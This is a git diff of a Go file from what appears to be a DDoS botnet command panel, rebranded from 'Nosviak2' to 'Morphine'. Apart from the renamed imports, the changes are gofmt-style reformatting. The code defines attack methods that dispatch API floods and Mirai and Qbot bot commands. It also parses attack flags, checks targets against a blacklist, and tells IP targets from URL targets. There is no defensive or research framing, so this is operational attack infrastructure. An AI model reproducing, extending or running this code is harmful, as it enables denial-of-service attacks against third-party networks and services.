@@ -1,22 +1,22 @@
 package attacks
 
 import (
-	"Nosviak2/core/configs/models"
-	"Nosviak2/core/sources/layouts/json"
-	"Nosviak2/core/sources/layouts/toml"
+	"Morphine/core/configs/models"
+	"Morphine/core/sources/layouts/json"
+	"Morphine/core/sources/layouts/toml"
 	"net"
 	"net/url"
 	"regexp"
 	"strings"
 )
 
-//stores the information properly
-//this will ensure its done without any errors
+// stores the information properly
+// this will ensure its done without any errors
 type Method struct { //stored inside a structure properly
-	Enabled bool
-	Permissions []string
+	Enabled           bool
+	Permissions       []string
 	Name, Description string
-	Options *models.Options
+	Options           *models.Options
 
 	//stores the attack type
 	//this will allow for support for different senders properly
@@ -25,20 +25,20 @@ type Method struct { //stored inside a structure properly
 
 	//stores the api based launched protocol
 	//this will be what we launch via properly
-	ApiInterface models.RequestLaunched	
+	ApiInterface models.RequestLaunched
 
 	//stores the mirai interface properly
 	//this will store the mirai id properly without issues
-	MiraiInteface int //method id properly
-	MiraiPortInterface int //method port id flag	
+	MiraiInteface      int //method id properly
+	MiraiPortInterface int //method port id flag
 
 	//stores the qbot arguments properly
 	//this will ensure its done without errors
 	QbotArguments []string //stores the argument
 }
 
-//tries to get the method properly
-//this will ensure its done without any errors happening
+// tries to get the method properly
+// this will ensure its done without any errors happening
 func QueryMethod(method string) *Method { //returns the query properly
 	//ranges through all api floods
 	//this will send via a json flood properly
@@ -70,14 +70,14 @@ func QueryMethod(method string) *Method { //returns the query properly
 	return nil
 }
 
-//checks if its the value or a flag
-//if its a flag we will return true else we will ignore
+// checks if its the value or a flag
+// if its a flag we will return true else we will ignore
 func Defaulter(i string) bool { //returns a boolean type
 	return ValidateAttackPrefix(i, toml.AttacksToml.Attacks.KVPrefix)
 }
 
-//properly checks for the attack prefix
-//this will ensure its done without issues happening
+// properly checks for the attack prefix
+// this will ensure its done without issues happening
 func ValidateAttackPrefix(cmd string, prefix string) bool { //returns true if valid
 	//ranges through the cmd properly
 	//this will ensure its done without errors
@@ -91,8 +91,8 @@ func ValidateAttackPrefix(cmd string, prefix string) bool { //returns true if va
 	return false //false as its invalid
 }
 
-//this will store the information properly
-//allows for better control without issues happening
+// this will store the information properly
+// allows for better control without issues happening
 func CheckBlacklist(target string) (bool, error) { //returns boolean if target is blacklisted
 	//ranges through the toml config properly
 	//this will check each object without issues
@@ -100,7 +100,7 @@ func CheckBlacklist(target string) (bool, error) { //returns boolean if target i
 		//compiles the regexp properly
 		//makes sure its done without issues
 		m, err := regexp.MatchString(host, target) //checks reg properly
-		if err != nil { //error handles properly without issues happening
+		if err != nil {                            //error handles properly without issues happening
 			return false, err //returns the error properly without issues happening
 		}
 		//checks if its true
@@ -108,7 +108,7 @@ func CheckBlacklist(target string) (bool, error) { //returns boolean if target i
 		if m { //detects true properly
 			return true, nil //returns true
 		}
-	}; 
+	}
 
 	//ranges through the toml config properly
 	//this will check each object without issues
@@ -116,7 +116,7 @@ func CheckBlacklist(target string) (bool, error) { //returns boolean if target i
 		//compiles the regexp properly
 		//makes sure its done without issues
 		m, err := regexp.MatchString(host, target) //checks reg properly
-		if err != nil { //error handles properly without issues happening
+		if err != nil {                            //error handles properly without issues happening
 			return false, err //returns the error properly without issues happening
 		}
 		//checks if its true
@@ -124,13 +124,13 @@ func CheckBlacklist(target string) (bool, error) { //returns boolean if target i
 		if m { //detects true properly
 			return true, nil //returns true
 		}
-	}; 
-	
+	}
+
 	return false, nil
 }
 
-//returns the group model properly
-//this will return the pointer for it properly
+// returns the group model properly
+// this will return the pointer for it properly
 func FindGroup(method *Method) *models.Group {
 	//ranges through all the groups
 	//this will return the value properly
@@ -142,14 +142,14 @@ func FindGroup(method *Method) *models.Group {
 	return nil
 }
 
-//checks if the incoming target is an ip
-//this will ensure its odne without errors happening
+// checks if the incoming target is an ip
+// this will ensure its odne without errors happening
 func IsIP(target string) bool { //returns a boolean properly
 	return net.ParseIP(target) != nil
 }
 
-//checks if the incoming target is a domain
-//this will follow through with the domain attack
+// checks if the incoming target is a domain
+// this will follow through with the domain attack
 func IsURL(ip string) bool { //returns a boolean properly
 	u, err := url.ParseRequestURI(ip)
 	return u != nil && err == nil
